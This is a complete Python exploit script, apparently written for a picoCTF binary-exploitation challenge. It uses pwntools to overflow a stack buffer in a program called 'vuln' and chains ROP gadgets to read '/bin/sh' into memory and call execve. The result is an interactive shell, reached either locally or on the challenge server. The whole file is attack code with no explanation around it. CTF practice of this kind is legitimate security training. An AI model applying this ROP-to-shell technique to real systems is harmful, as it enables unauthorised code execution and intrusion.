#!/usr/bin/env python3
from pwn import *

# Setup
context.log_level = 'debug'
context.arch = 'amd64'
context.os = 'linux'

BINARY = './vuln'
HOST = 'shape-facility.picoctf.net'
PORT = 59092

# Dirty gadgets
POP_RDI_DIRTY = 0x00000000004022f8  # pop rdi ; pop rbp ; ret
POP_RSI_DIRTY = 0x000000000040b686  # pop rsi ; pop rbp ; ret
POP_RDX      = 0x0000000000438152   # pop rdx ; ret
POP_RAX      = 0x000000000042b20b   # pop rax ; ret
SYSCALL      = 0x0000000000401378   # syscall
RET          = 0x000000000040101a   # ret (for alignment)

def get_connection(mode):
    if mode == 'local':
        return process(BINARY)
    elif mode == 'remote':
        return remote(HOST, PORT)
    else:
        log.error("Use 'local' or 'remote'")
        exit(1)

def exploit(conn):

    conn.recvuntil(b'What number would you like to guess?\n')
    conn.sendline(b"84")

    exe = ELF(BINARY, checksec=False)
    bss = exe.bss()

    offset_to_ret = 120  # adjust as needed; cyclic can help
    payload1 = b"A" * offset_to_ret
    payload1 += p64(POP_RDI_DIRTY) + p64(0) + p64(0)       # rdi = stdin, rbp dummy
    payload1 += p64(POP_RSI_DIRTY) + p64(bss) + p64(0)     # rsi = .bss, rbp dummy
    payload1 += p64(POP_RDX) + p64(8)                      # rdx = 8 bytes
    payload1 += p64(POP_RAX) + p64(0)                      # rax = 0 (sys_read)
    payload1 += p64(SYSCALL)

    conn.recvuntil(b'Name? ')
    conn.sendline(payload1)


    conn.sendline(b"/bin/sh\x00")

    payload2 = b"B" * offset_to_ret
    payload2 += p64(RET)  # stack alignment
    payload2 += p64(POP_RDI_DIRTY) + p64(bss) + p64(0)    # rdi = pointer to "/bin/sh", rbp dummy
    payload2 += p64(POP_RSI_DIRTY) + p64(0) + p64(0)      # rsi = 0, rbp dummy
    payload2 += p64(POP_RDX) + p64(0)                      # rdx = 0
    payload2 += p64(POP_RAX) + p64(59)                     # rax = 59 (execve)
    payload2 += p64(SYSCALL)

    conn.recvuntil(b'What number would you like to guess?\n')
    conn.sendline(b"87")
    conn.recvuntil(b'Name? ')
    conn.sendline(payload2)

    conn.interactive()

def main():
    import sys
    if len(sys.argv) != 2:
        log.error("Usage: python3 exploit.py [local|remote]")
        exit(1)

    conn = get_connection(sys.argv[1])
    exploit(conn)
    conn.close()

if __name__ == "__main__":
    main()
